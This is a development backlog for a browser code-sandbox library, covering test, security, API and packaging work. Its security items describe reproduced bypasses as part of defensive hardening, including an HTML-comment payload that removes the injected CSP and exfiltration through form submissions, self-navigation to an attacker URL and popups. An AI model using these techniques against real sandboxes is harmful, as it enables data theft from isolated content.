# Backlog

The open work on `web-sandbox`, in one place: broken foundations first, then security,
capabilities, parity with existing solutions, and repo hygiene.

Every "current state" line below was verified against the code on 2026-08-29 — commands run,
line numbers checked. Where a document or a README claims something the code does not do, the
gap is filed as an item rather than quietly edited away.

Whether this project should continue at all — rather than adopting an existing solution — is
answered separately in [ADR-001](ADR-001-continue-or-adopt.md). This backlog assumes its
conditional "continue".

**Priority**: P0 blocks everything else · P1 next · P2 planned · P3 opportunistic.
**Effort**: S ≈ hours · M ≈ days · L ≈ week+.

---

## Snapshot

| Area | State |
| :--- | :--- |
| Core isolation (`srcdoc` + opaque origin + immutable CSP) | ✅ implemented, `src/host.ts` |
| CSP generation from typed config | ✅ implemented + 12 unit tests |
| Private `MessageChannel` transport | ✅ implemented, iframe + worker |
| Worker-mode isolation | ✅ worker spawned inside the sandbox frame (S1) |
| Unit tests | ✅ `src/**` and `test/unit` run and pass (T2) |
| E2E tests | ✅ e2e + research specs run on a shared harness (T1); virtual files spec is `fixme` (section C) |
| `bun run test` / `bun run build` | ✅ both work from a clean checkout (T3) |
| Type check | 🟡 91 errors, all in `playground/` and `sw.ts`; `src/host.ts` is clean (H3) |
| CI | ✅ unit + build + e2e on Chromium, Firefox, WebKit (D2) |
| CSP delivery | 🟡 `<meta>` only, now always first in `<head>` (S2 fixed); 3 directives discarded (S7, S8) |
| Default policy | ✅ `base-uri` and `form-action` default to `'none'` (S9) |
| Installable package | ❌ `private: true`, `main` points at a missing file (D1) |

*Updated after the fixes for [issue #6](https://github.com/MentalGear/web-sandbox/issues/6): milestone
M1 plus S1, S2, S9 and the new S10–S12 are done. Items marked ✅ below keep their original text as a
record of what was wrong.*

---

## T · Broken Foundations

### T1 · The entire e2e suite is dark — ✅ **done**

**Done**: every spec now drives `test/e2e/harness.html` through the `SandboxDriver` fixture in
`test/e2e/fixture.ts`. The playground can move without touching the suite.

Every security claim in `docs/research/` is backed by a spec in `test/e2e/`. None of them runs.

**Verified**: all 15 specs fail. Two mechanical causes, both from the playground move:

1. Specs navigate to `http://localhost:4444/` (e.g. `test/e2e/basic.spec.ts:4`), but Vite's root
   has no `index.html` — the playground is at `/playground/index.html`. Every `page.goto` returns
   `ERR_HTTP_RESPONSE_CODE_FAILURE`.
2. Specs call `setConfig({ scriptUnsafe: true })` without `capabilities`. The default is
   `capabilities: []` (`src/host.ts:38`), so the iframe gets `sandbox=""` — no `allow-scripts`,
   no execution, and every `waitForEvent('console')` times out at 30s.

**Proof the fix is mechanical**: with the URL corrected and `capabilities: ['allow-scripts']`
added, `basic.spec.ts` passes in 2.3s.

**Work**: introduce a shared fixture that owns the page URL and a baseline config, and rewrite
the specs against it, so the next playground move breaks one file instead of fifteen.

**Acceptance**: `bun run test:e2e` runs green; deliberately reverting a mitigation turns the
matching `reproduce.spec.ts` red.

### T2 · `test/unit` never runs, and is red when it does — ✅ **done**

**Done**: vitest includes `test/unit`; the test imports `ALLOWED_CAPABILITIES` from
`@src/csp-directives`, its real home, so no new public export was added to `host.ts`.

**Verified**: `test:unit` is `bun vitest --dir src`, so `test/unit/host.test.ts` is silently
excluded. Run it directly and both cases fail: it imports `ALLOWED_CAPABILITIES` from `@src/host`,
but `host.ts` only *imports* that symbol from `./csp-directives` (`src/host.ts:2`) and never
re-exports it, so the value is `undefined`.

This is the deny-list test that guards findings 01, 02 and 05 — the ones that all root-cause to
`allow-same-origin`. It has been asserting nothing.

**Work**: widen the vitest scope to include `test/unit`, and either re-export the constant from
`host.ts` or import it from `@src/csp-directives`. Decide deliberately, since it is public API.

**Acceptance**: `bun run test:unit` collects both directories and is green; deleting the filter
in `setConfig()` (`src/host.ts:70`) turns it red.

### T3 · `bun test` and `bun run build` fail on stale paths — ✅ **done**

**Done**: `bun run test` runs unit then e2e (`bun test` without `run` is Bun's own runner, so the
README now says `bun run test`); Playwright starts Vite itself; `vite build` targets the playground;
`build.ts` no longer copies the removed demo page.

**Verified**, four dead paths:

| Path | Referenced from | Reality |
| :--- | :--- | :--- |
| `research/playwright.config.ts` | `package.json` `test:e2e` | no `research/` dir; config is at repo root |
| `bun vendor/web-sandbox/index.ts` | `playwright.config.ts:30` `webServer.command` | no `vendor/` dir |
| `http://localhost:4444` | `playwright.config.ts:31` `webServer.url` | 404s; the served page is `/playground/index.html` |
| `playground/virtual-files-demo.html` | `build.ts:38` | replaced by `playground/index.html` |

**Work**: point `test:e2e` at the root config, set `webServer.command` to `bun run dev` and
`webServer.url` to the playground, and fix `build.ts`. Note `playwright.config.ts` uses
`testDir: "test"`, which also sweeps up the vitest file from T2 — scope it to `test/e2e`.

**Acceptance**: `bun test` runs unit **and** e2e from a clean checkout; `bun run build` completes.

### T4 · Presets are not wired into the tests — **P1 · M**

The README's stated USP is *"Use the same Preset definitions for both manual testing (Playground)
and automated regression testing"*.

**Verified**: `src/lib/presets.ts` defines 18 presets covering findings 01–10 — and
`playground/playground.ts` is the only file that imports it. No test references presets; the
specs hard-code their payloads. The unification is documented but not built.

**Work**: drive the e2e regression specs from `PRESETS`, so a new attack vector is added once.

**Acceptance**: each `reproduce.spec.ts` sources its payload and rules from a preset id; adding a
preset without a spec fails a coverage assertion.

---

## S · Security & Correctness

### S1 · Worker mode escapes the sandbox CSP — ✅ **done**

**Done**: worker mode now creates the sandbox frame too, and a bootstrap inside it spawns the worker
(`src/lib/worker-bootstrap.ts`), so the worker inherits the opaque origin and the sandbox CSP. A
timeout recreates the frame, which terminates the worker. `test/e2e/worker-security.spec.ts`.

**Verified**: `spawnWorker()` builds a `blob:` URL and calls `new Worker()` on the *host* document
(`src/host.ts:206–210`), so the worker inherits the host origin and host CSP — not the sandbox
policy. `initialize()` skips iframe creation entirely in worker mode (`src/host.ts:195`). The code
says so at `src/host.ts:196`:

> `// TODO: this is wrong! we need to place the worker inside the iframe, oterwise the worker has full network access (has host CSP policy)`

`COMPETITOR_ANALYSIS_2.md` lists headless mode as a differentiator, and
`test/e2e/worker-security.spec.ts` claims to assert it — but per T1 that spec has never run.

**Work**: always create the iframe; spawn the worker from inside it so it inherits the opaque
origin and injected CSP; route the `MessagePort` handshake through the frame.

**Acceptance**: worker-mode `fetch` to a domain absent from `connectionsAllowed` is blocked, and
`importScripts` of an external URL fails — asserted in a *running* spec.

### S2 · User markup can delete the injected CSP — ✅ **done**

**Done**: the security block is prepended before any user content instead of spliced into it
(`buildGuestDocument()` in `src/lib/frame-documents.ts`). The parser ignores the user's later
doctype and `<head>` and merges `<html>`, so the CSP meta is always the first parsed `<head>` child.
Asserted against a hostile corpus in `frame-documents.test.ts` and in-browser by research 11.3.

*Raised from P1 after [Research 11.3](research/11_meta_csp_delivery/README.md) reproduced it.*

**Verified**: `createIframe()` inserts the `<meta>` CSP by string-replacing `<head>` or the
`<html…>` tag (`src/host.ts:267–271`), guarded only by `unsafeContent.toLowerCase().includes('<html')`.
Two of the repo's own TODOs sit on those lines (`src/host.ts:261`, `:265`):

> `// TODO: is this secure enough for user provided content? Could user-content contain some trick to avoid having this inserted?`

**Reproduced**: `String.replace` with a non-global regex replaces the *first* textual match
anywhere in the string, with no notion of document structure. The payload
`<html><body><!-- <head> -->…` captures the injection inside an HTML comment, and the sandbox
reports `document.querySelector('meta[http-equiv="Content-Security-Policy"]') === null` — the
document runs with **no CSP at all**. The security block, `<base>` tag and comms script all
vanish with it.

Isolation held in that test, but via the opaque origin (the fetch failed on CORS, not CSP). With
the policy gone, `connect-src` allowlisting is gone: `no-cors` beacons, `sendBeacon`, form posts
and `<a ping>` remain reachable, and the request URL is the exfiltration channel.

Related: a policy that lands outside the *parsed* `<head>` is dropped entirely, not partially
(Research 11.2) — so being textually first is not sufficient.

**Work**: replace regex splicing with a parse-then-serialize step, or prepend the security block
before any user content and assert the parsed result. Fuzz it against hostile inputs.

**Acceptance**: `docs/research/11_meta_csp_delivery/reproduce.spec.ts` §11.3 passes (it is written
to fail against today's code), and the meta is asserted to be the first *parsed* head child across
a corpus of malformed and hostile documents.

### S3 · The session id is readable by sandboxed code — **P1 · S**

**Verified**: with virtual files enabled, the session UUID is embedded in the `<base href>`
(`src/host.ts:228`, `:257`). `sw.ts` treats that id as a capability token — *"possession of the
URL implies access rights"* (`src/virtual-files/sw.ts:44-46`) — but the sandbox can read its own
`<base>` and exfiltrate it wherever CSP permits. The TODO at `src/host.ts:227` asks the same
question.

**Work**: either stop treating the id as a secret and add an origin/mode check in the SW fetch
handler, or rotate per load and keep the mapping host-side. Document which model is in force.

**Acceptance**: a spec showing another sandbox instance cannot read the first instance's files
even when handed its session id.

### S4 · `scriptUnsafe` has no guard rail — **P1 · S**

**Verified**: `scriptUnsafe: true` appends `'unsafe-eval'` to `script-src` (`src/host.ts:246`)
with no warning at any level; the TODO at `src/host.ts:9` asks for one. It is enabled in most
presets and in every e2e spec, so it is the path of least resistance for a copy-paste consumer.

**Work**: a one-time console warning when enabled, and a prominent README note that it exists for
testing. **Acceptance**: enabling it emits exactly one warning per instance.

### S5 · No CSP violation reporting — **P2 · M**

`test/e2e/security.spec.ts:29` records the gap in a comment: *"web-sandbox doesn't have CSP
violation reporting hooked up to postMessage yet"*. Tests must therefore assert the *absence* of a
success log with a 2s timeout — slow and prone to false green.

**Work**: listen for `securitypolicyviolation` inside the sandbox and forward it over the port as
a first-class event. **Acceptance**: a blocked request produces an observable `violation` event on
the host, and the security specs assert on it directly.

### S6 · No execution budget in iframe mode — **P2 · M**

**Verified**: `workerExecutionTimeout` is enforced only when `mode === 'worker'`
(`src/host.ts:136`). A busy loop in iframe mode blocks the host's main thread with no recourse,
and nothing caps allocation in either mode. See [`RESOURCE_QUOTAS.md`](research/RESOURCE_QUOTAS.md).

**Work**: pair with B2's watchdog; recreate the frame on timeout; sample
`performance.measureUserAgentSpecificMemory()` where available.

**Acceptance**: an infinite loop and an allocation bomb are both terminated instead of hanging or
crashing the tab.

---

### S7 · Silently ignored CSP directives — **P1 · S**

*From [Research 11.1](research/11_meta_csp_delivery/README.md).*

**Verified**: a `<meta>`-delivered policy discards `frame-ancestors`, `report-uri`/`report-to` and
`sandbox` — Chromium logs *"is ignored when delivered via a `<meta>` element"* for each.
`CSPDirectives` exposes `frame-ancestors` (`src/csp-directives.ts`) and `generateCSP()` emits it
whenever a consumer supplies a non-empty array. Nothing warns them, so a consumer who sets it
believes they restricted embedding and has configured nothing. The shipped default passes `[]`,
which is dropped as empty, so only the public config surface is affected.

**Work**: reject or warn on these four directives in `generateCSP()` under meta delivery; move
embedding control to the host element. Note this also rules out `report-uri`/`report-to`, leaving
the in-sandbox `securitypolicyviolation` event (S5) as the only reporting route.

**Acceptance**: setting `frame-ancestors` raises a warning (or throws) rather than emitting a
directive the browser discards.

### S8 · Pre-policy egress window — **P3 · accepted risk**

*From [Research 11.4](research/11_meta_csp_delivery/README.md).*

**Verified**: in 1 of 5 runs a request reached the network from the transient `about:blank`
document, before the meta policy took effect. It is racy and **branch-independent** — it appeared
on the well-formed document, which takes the safest injection path. The CSP violation was still
logged, so the resource was blocked from *use*; the request itself still left, which is sufficient
for exfiltration where the URL is the payload.

**No mitigation exists under `<meta>` delivery** — the window is inherent to the mechanism. It
closes only under header delivery, where the policy arrives with the response carrying the content.
Tracked as a known limitation; see [ADR-001](ADR-001-continue-or-adopt.md).

### S9 · `base-uri` and `form-action` are silently unrestricted — ✅ **done**

**Done**: `generateCSP()` emits `'none'` for an empty directive listed in `NON_FALLBACK_DIRECTIVES`
(`base-uri`, `form-action`). `frame-ancestors` is left out on purpose: browsers ignore it under
`<meta>` delivery (S7). Research 12 passes.

*From [Research 12](research/12_non_fallback_directives/README.md).*

**Verified**: `generateCSP()` omits empty-array directives, documented as *"Empty arrays are
omitted to allow `default-src` fallback"* (`src/lib/csp/csp-generator.ts:3-5`). That reasoning
holds for fetch directives but **not** for `base-uri` or `form-action`, which have no fallback.
The shipped default sets both to `[]`, so the emitted policy is:

```
default-src 'none'; upgrade-insecure-requests; script-src 'self' 'unsafe-inline';
style-src 'unsafe-inline'; worker-src blob: data:;
```

— with no `base-uri` and no `form-action`, i.e. **both unrestricted**.

**Exploited**: with `capabilities: ['allow-scripts', 'allow-forms']` (both sanctioned values in
`ALLOWED_CAPABILITIES`) and the default `connectionsAllowed`, a `GET` form submitted to a
non-allowlisted target reached the network as `…?stolen=session-secret`, **with no CSP violation
logged**. A form is a complete exfiltration primitive: no `fetch`, no `connect-src`, no bridge.

`base-uri` is the mitigation [finding 10](research/10_base_tag_hijacking/README.md) recommended
for itself and never got — and it matters more than that finding knew, since the VFS routes assets
through an injected `<base href>` (`src/host.ts:257`).

**Work**: teach `generateCSP()` which directives fall back and which do not; emit `'none'` for an
empty non-fallback directive instead of omitting it. Default `base-uri` to `'self'` and
`form-action` to `'none'`. Document that `[]` means *deny* in this config surface.

**Acceptance**: `docs/research/12_non_fallback_directives/reproduce.spec.ts` passes (both cases are
written to fail against today's code).

### S10 · The guest frame can navigate itself to carry data out — ✅ **done**

*From [issue #6](https://github.com/MentalGear/web-sandbox/issues/6) (N1) and
[Research 14](research/14_self_navigation/README.md).*

**Verified**: with only `allow-scripts`, `location.href = attacker + secret` sent the secret in the
request URL. Sandbox flags stop top-level navigation, not self-navigation, and no CSP directive
governs it.

**Done**: the guest frame sits inside a library-owned wrapper frame whose policy is
`frame-src 'none'`. The embedder's `frame-src` is checked on every navigation of a child frame,
including ones the child starts, before the request is sent. Research 14.1 covers script, link,
`window.open(…, '_self')` and meta refresh.

Confirmed in Chromium, Firefox and WebKit (CI).

### S11 · A fresh port is handed to whatever document loads next — ✅ **done**

*From issue #6 (N2).*

**Verified**: `onload` called `setupChannel()` on every load, posting a new `MessagePort` (and queued
`execute()` code) to `'*'`. After S10 the attacker's page received a live channel.

**Done**: the channel is set up exactly once per frame. A second load closes the port, drops the
queue, removes the frame and fires `terminated`; `execute()` is refused until the next
`setConfig()` / `load()`. Research 14.2.

### S12 · Risky capabilities are on the allow-list — ✅ **done**

*From issue #6 (N3) and [Research 13](research/13_popup_exfiltration/README.md).*

**Verified**: `ALLOWED_CAPABILITIES` included `allow-popups` (URL exfiltration through a new
top-level window, which neither CSP nor the wrapper's `frame-src` covers), `allow-modals`,
`allow-downloads` and `allow-presentation`.

**Done**: split into `SAFE_CAPABILITIES` (`allow-scripts`, `allow-forms`, `allow-pointer-lock`,
`allow-orientation-lock`) and `UNSAFE_CAPABILITIES` (popups, modals, downloads, presentation). Unsafe
ones are dropped from `capabilities` with a warning and accepted only through `unsafeCapabilities`,
which warns once per capability per instance. `allow-forms` stays safe: `form-action` defaults to
`'none'` (S9) and a form submission is a navigation the wrapper blocks (S10).

## B · API Surface & DX

### B1 · Promise-based RPC in both directions — **P1 · M**

*Parity gap*: `websandbox` (`connection.remote.fn()`), Penpal and Zoid all offer this; we do not.

**Verified**: `execute(code)` is fire-and-forget (`src/host.ts:119`); the in-sandbox script runs
`new Function(code)` and discards the return value (`src/lib/in-sandbox-script.ts:15`). Only `LOG`
frames travel back, so a caller cannot await a result and a thrown error arrives as a log line
rather than a rejected promise. The transport for this already exists — it is the framing that is
missing.

**Work**: **prefer adopting Penpal over hand-rolling this** — promise-based `postMessage`
correlation is a commodity, and our `MessageChannel` layer already provides the transport it
frames (see [ADR-001](ADR-001-continue-or-adopt.md#hybrid-strategy-adopt-the-commodity-keep-the-differentiator);
confirm licence compatibility first). If built in-house: a correlated `{id, type, payload}`
envelope over the existing port; `sandbox.call(name, ...args): Promise<T>` on the host and a
symmetric `host.call()` inside; keep `execute()` as the `scriptUnsafe`-gated escape hatch.

**Acceptance**: `await sandbox.call('sum', 1, 2) === 3`; a sandbox-side throw rejects with the
original message; identical behaviour in both modes.

### B2 · Lifecycle: `terminate()`, `reset()`, state — **P1 · M**

**Verified**: teardown is private (`initialize()`, `_cleanupWorker()`); consumers have no
supported way to stop a runaway sandbox or to observe its state.

**Work**: public `terminate()` / `reset()`, a readonly state
(`idle → initializing → ready → running → terminated`), and the watchdog S6 needs. Supersedes the
state-machine sketch in `IMPROVEMENTS.md` §4 without the XState dependency.

**Acceptance**: `reset()` yields a fresh opaque origin; `terminated` fires exactly once.

### B3 · Per-instance events — fixes a live defect — **P1 · S**

**Verified**: logs dispatch on `window` (`src/host.ts:139`, `:156`, `:212`) while
`SandboxDevTools` filters `if (e.target !== this._sandbox) return;` (`src/devtools.ts:13`). The
target is always `window`, so **the filter drops every log and DevTools shows nothing**. Two
sandboxes on one page are also indistinguishable — which is why the playground listens globally
(`playground/playground.ts:78`) and why `test/e2e/local-html.spec.ts:30` works around it.

**Work**: dispatch `log` / `error` / `violation` / `terminated` on the element; keep a documented
opt-in global mirror for the playground.

**Acceptance**: with two sandboxes mounted, each receives only its own logs; DevTools output is
covered by a test.

### B4 · The library never registers its element — ✅ **done**

**Was**: `customElements.define(...)` appeared only in the playground, so a consumer importing the
bundle got an inert tag with no hint that registration was theirs to do.

**Done**: `defineWebSandbox(tagName = 'web-sandbox')` in `src/host.ts` registers the element,
is idempotent, and throws if the tag is taken by a different element. Importing still registers
nothing, so consumers can choose their own tag. The playground and the e2e harness use it.

**Open**: the D1 smoke test (mount a sandbox using only the public entry point) waits on D1.

### B5 · Host-mediated `sandbox.fetch` bridge — **P2 · M**

*Parity gap*: Zoid's strict bridge. *Motivated by* [finding 04](research/04_websocket_bypass/README.md)
(WebSockets bypass any SW-level logging) and [finding 09](research/09_monkey_patch_bypass/README.md)
(monkey-patching `fetch` is trivially undone).

**Current state**: no bridge. CSP controls *whether* a request is allowed but yields no record of
it, so the host has no traffic log.

**Work**: per `IMPROVEMENTS.md` §2 — expose `sandbox.fetch` over the port, default to
`connect-src 'none'` in bridged mode, polyfill `globalThis.fetch` onto it. Document the trade-off:
libraries reaching for a raw socket break, deliberately.

**Acceptance**: every sandbox-initiated request appears in a host-side log; a direct `WebSocket`
is refused by CSP in bridged mode.

### B6 · Content auto-sizing — **P2 · S**

*Parity gap*: the headline feature of `cross-origin-html-embed`; Zoid ships it too.
**Verified**: the iframe is pinned to `width:100%;height:100%` (`src/host.ts:224`).
**Work**: a `ResizeObserver` inside the sandbox reporting `scrollHeight` over the port, opt-in via
`autoResize`. **Acceptance**: host element height tracks content within one frame.

---

## C · Virtual Files

### C1 · In-sandbox VFS API — **P1 · M**

**Verified**: one-way only. The host pushes with `registerFiles()` (`src/host.ts:92`); sandboxed
code can *load* files through the `<base>` tag but cannot list, read or write them.
[`RESEARCH_VFS_ACCESS.md`](research/RESEARCH_VFS_ACCESS.md) specifies the API; it is unimplemented.
`test/e2e/virtual-files.spec.ts:19` notes the same absence.

**Work**: implement the research doc's message-bridge option as `sandbox.fs.read/write/list`,
mediated by the host so policy stays on the trusted side.

**Acceptance**: sandboxed code writes a file, reads it back, and the host sees `fileschanged`.

### C2 · MIME types and binary files — **P1 · S**

**Verified**, two defects in `src/virtual-files/sw.ts`: every response is served as
`text/javascript` (`sw.ts:61`, marked `// TODO: Proper MIME`), and `fileCache` is a
`Map<string, string>` written with `content as string` (`sw.ts:2`, `:29`) although
`registerFiles()` advertises `Record<string, string | Uint8Array>` (`src/host.ts:92`). **Binary
registration is broken at the type boundary**, and CSS or images served as JavaScript are rejected
by strict MIME checking.

**Work**: extension→MIME resolution; store `string | Uint8Array` and build the `Response` from the
stored type. **Acceptance**: the SVG and CSS in `playground/test-assets/` load inside the sandbox,
asserted in `test/e2e/virtual-files-real.spec.ts`.

### C3 · File lifecycle and eviction — **P2 · S**

*The lesson of [finding 08](research/08_session_exhaustion/README.md), applied client-side.*
**Verified**: `fileCache` grows without bound and is never pruned (`sw.ts:2`); entries keyed by a
dead session id outlive the sandbox for the Service Worker's lifetime.

**Work**: `unregisterFiles()` / `clearSession()`, drop a session's keys on terminate, cap bytes per
session. **Acceptance**: terminating a sandbox releases its VFS entries.

### C4 · Service Worker update integrity — **P2 · M**

Adopt the main-thread pre-registration verification and versioned SW paths from
[`SW-verify-before-update.md`](research/SW-verify-before-update.md).
**Acceptance**: a modified SW payload fails verification and is not registered.

---

## D · Packaging & Distribution

### D1 · Ship an installable package — **P0 · S**

Every solution we compare against installs with one command. We do not install at all, which caps
adoption regardless of how good the isolation is.

**Verified in `package.json`**: `"private": true`; `"main": "dev-server.ts"` — **a file that does
not exist**; no `exports`, no `types`; `build-dist` emits JS without declarations. `README.md`
also documents a `server.ts` that does not exist (the dev server is a Vite plugin in
`vite.config.ts`).

**Work**: drop `private`, add `exports` + `types` with declaration emit, fix `main`, align the
README with the real entry points.

**Acceptance**: a packed tarball imports cleanly in a scratch project with working types, and a
smoke test mounts a sandbox through the public entry point (with B4).

### D2 · CI — ✅ **done**

**Done**: `.github/workflows/ci.yml` runs unit tests and both builds, and the e2e suite on Chromium,
Firefox and WebKit, on push to `main` and on every PR. `tsc --noEmit` still waits on H3.

**Verified**: `playwright.config.ts` defines chromium, firefox and webkit projects and
[`BROWSER_COMPATIBILITY.md`](research/BROWSER_COMPATIBILITY.md) makes claims about all three — but
there is no `.github/` directory, so nothing runs on merge. This is what allowed T1–T3 to rot
undetected.

**Work**: a workflow running unit + e2e (+ `tsc --noEmit` once H3 lands) on push and PR.
**Acceptance**: reverting any mitigation fails the PR. Order this immediately after T1–T3, or the
same drift recurs.

### D3 · API reference and adapters — **P3 · M**

Document the public surface once B1–B4 stabilise it; thin React/Vue wrappers around the element.
**Acceptance**: a consumer can integrate from the docs without reading `host.ts`.

---

## H · Repo & Docs Hygiene

### H1 · Duplicate documents — **P2 · S**

**Verified byte-identical pairs**:
- `docs/research/VIRTUAL_FILES_SECURITY_ANALYSIS.md` ≡ `docs/research/Virtual-Files-Security-Architecture.md`
- `docs/Sandbox_Architecture_Decision.md` ≡ `docs/research/ARCHITECTURE_COMPARISON.md`

Plus heavy overlap between `VFS_ARCHITECTURE.md`, `VIRTUAL_FILES_PLAN.md` and
`RESEARCH_VFS_ACCESS.md`. **Work**: keep one of each pair, leave a stub pointing at it.

### H2 · Naming drift — ✅ **done**

**Was**: four names for one project — `lofi-sandbox` (the element), `lofi-web-sandbox` (the package),
`iframe-sandbox` (older docs) and "Lofi Sandbox" (prose).

**Done**: one name, **web-sandbox**: the repository, the package, the default element
`<web-sandbox>` and the class `WebSandbox`; "Web Sandbox" in prose. `iframe-sandbox` remains only
in research write-ups that describe that older architecture.

### H3 · Type check is not part of the build — **P2 · S**

**Verified**: `bun x tsc --noEmit` reports 91 errors — 84 in `playground/playground.ts` (untyped
`window.*` globals, unasserted `querySelector`), 6 in `sw.ts` (needs `lib: ["WebWorker"]`), and one
real bug: `src/lib/csp/csp-generator.test.ts:2` imports `CSPDirectives` from `./csp-generator`,
which does not export it. `src/host.ts` itself is clean. `tsconfig.json` also excludes `test/**`
from `include`, and `baseUrl` is deprecated for TS 7.

**Work**: type the playground's window surface, split a worker tsconfig for `sw.ts`, fix the test
import, include `test/`, replace `baseUrl` with relative paths. **Acceptance**: `tsc --noEmit` is
clean and runs in CI.

### H4 · Research index — ✅ **done**

`docs/research/README.md` now indexes all twelve findings with a per-finding status against the
current opaque-origin architecture, distinguishing "closed by construction" from "open". A
`docs/README.md` index was added alongside it.

### H5 · Missing repo basics — **P3 · S**

No `LICENSE`, no `CONTRIBUTING.md`, and `.prettierrc` exists with no `format` script and no
formatting check. **Work**: add a license (blocks D1 — publishing without one is a non-starter),
a short contributing note, and `format` / `format:check` scripts.

---

## Parity Reference

Where the items above come from. This table covers the solutions named in the repo's original
comparisons; for the 2026 entrants (`quickjs-wasi`, `@tanstack/ai-isolate-quickjs`, `zushi`,
`lifo`, BrowserPod) see the
[field scan in ADR-001](ADR-001-continue-or-adopt.md#field-scan--august-2026). Legend: ✅ shipped · 🟡 partial · ❌ missing · ➖ n/a by design.

| Capability | web-sandbox | websandbox | Penpal | Zoid | cross-origin-embed |
| :--- | :---: | :---: | :---: | :---: | :---: |
| Isolation with no server config | ✅ opaque origin | 🟡 | ➖ | ➖ | ❌ wildcard DNS |
| Private `MessageChannel` | ✅ | ❌ | 🟡 | ✅ | ❌ |
| Promise-based RPC | ❌ **B1** | ✅ | ✅ | ✅ | ➖ |
| Typed package / `d.ts` | ❌ **D1** | ✅ | ✅ | ✅ | ✅ |
| Headless (worker) execution | 🟡 **S1** | ❌ | ❌ | ❌ | ❌ |
| Virtual files | 🟡 **C1–C3** | ❌ | ➖ | ❌ | ❌ |
| Host-mediated network | ❌ **B5** | ❌ | ➖ | ✅ | ❌ |
| Auto-sizing | ❌ **B6** | ❌ | 🟡 | ✅ | ✅ |
| Execution quotas | 🟡 **S6** | ❌ | ➖ | ❌ | ➖ |

The two columns where we lead — isolation without server config, and the private channel — are the
ones the backlog must not regress.

Larger bets that follow from the same comparison, both **P3**: an **opt-in host-served mode** that
delivers CSP as an HTTP **header** while keeping the opaque origin via the `sandbox` attribute —
which closes S7, S8 and most of S2 at once, and needs no wildcard DNS (see
[ADR-001](ADR-001-continue-or-adopt.md); note this is *not* the unique-origin model, which is a
downgrade on the origin axis); and
a **logic tier evaluation** (upgraded from a speculative spike): as of the
[2026-08 field scan](ADR-001-continue-or-adopt.md#field-scan--august-2026) this is a solved,
MIT-licensed commodity — evaluate [`vercel-labs/quickjs-wasi`](https://github.com/vercel-labs/quickjs-wasi)
(VM snapshot/restore, which also serves B2's `reset()`) and `@tanstack/ai-isolate-quickjs`, with
[`reearth/zushi`](https://github.com/reearth/zushi) as the reference for how a QuickJS logic tier
meets an opaque-origin UI tier. Do not write a JS engine.

---

## Rejected / Out of Scope

| Proposal | Source | Why not |
| :--- | :--- | :--- |
| Wildcard DNS + SSL as the **default** | `cross-origin-html-embed` | Destroys the local-first property, the one thing no competitor offers. Opt-in only. |
| Iframe-scoped Service Worker ("hub" model) | Considered internally | Needs a sandbox origin that can register SWs, re-opening privilege escalation. See [`ARCHITECTURE_COMPARISON.md`](research/ARCHITECTURE_COMPARISON.md). |
| `allow-same-origin` for API compatibility | `websandbox` | Root cause of findings 01, 02 and 05. Enforced by T2's deny-list test. |
| Agent runtime in the trusted base | [`RESEARCH_SANDBOXING.md`](research/RESEARCH_SANDBOXING.md) | Keep the base dumb; agents load as user code so their bugs stay inside the sandbox. |
| BrowserPod / CheerpX as a dependency | [2026-08 field scan](ADR-001-continue-or-adopt.md#field-scan--august-2026) | Proprietary licence — free only for personal and open-source use. Disqualified as a dependency. |
| Building a full OS / Linux tier | Same | BrowserPod and `lifo` are years ahead, and it is not this project's problem. |
| Writing our own JS engine / VM tier | Same | `quickjs-wasi` and `@tanstack/ai-isolate-quickjs` are MIT and maintained. Adopt, don't build. |
| Nonce-based CSP instead of `'unsafe-inline'` | General best practice | No benefit under an opaque origin with immutable `srcdoc` CSP — [`CSP_CONFIG_RATIONALE.md`](CSP_CONFIG_RATIONALE.md) §3. |
| Server-side session quotas (rate limit, TTL, LRU) | [Finding 08](research/08_session_exhaustion/README.md), `IMPROVEMENTS.md` §1 | The local-first architecture has no server. Becomes P1 the moment a hosted mode ships; recorded so the requirement is not lost with the server that was removed. |

---

## Already Done

So `IMPROVEMENTS.md` is not re-proposed wholesale:

- **`MessageChannel` communication** (§3) — `setupChannel()` (`src/host.ts:150`), both modes.
- **CSP generation from typed config** — `src/lib/csp/csp-generator.ts`, hardened with a
  `default-src 'none'` fallback and 12 passing unit tests.
- **Opaque origin via `srcdoc`** — closes findings 03 and 05 by construction.
- **Headless worker mode** — isolated inside the sandbox frame since S1.

---

## Suggested Order

| Milestone | Items | Why in this order |
| :--- | :--- | :--- |
| **M1 · Turn the lights on** | T1, T2, T3, D2 | Until the suite runs, no security claim is verified and no later change is safe. CI belongs here so the same drift cannot recur. |
| **M2 · Make the claims true** | S1, S2, S7, S9, D1, B3, B4 | A documented capability that does not hold (S1) or does not install (D1) costs more than a missing one. B3/B4 ride along — DevTools is silent and the element self-registers nowhere. |
| **M3 · Harden** | S3, S4, T4, H3 | The injection path and the session-id model are the two places where the design's assumptions are unverified; presets and type checking keep them that way. |
| **M4 · Make it adoptable** | B1, B2, C1, C2 | RPC + lifecycle is the parity bar set by websandbox and Penpal; the VFS is the differentiator, so it must actually work. |
| **M5 · Extend** | B5, B6, C3, C4, S5, S6, D3, H1, H2, H5 | Observability, quotas, docs and hygiene once the base is trustworthy. |
| **Bets** | hosted-origin mode, QuickJS spike | Independent; run when there is slack. |
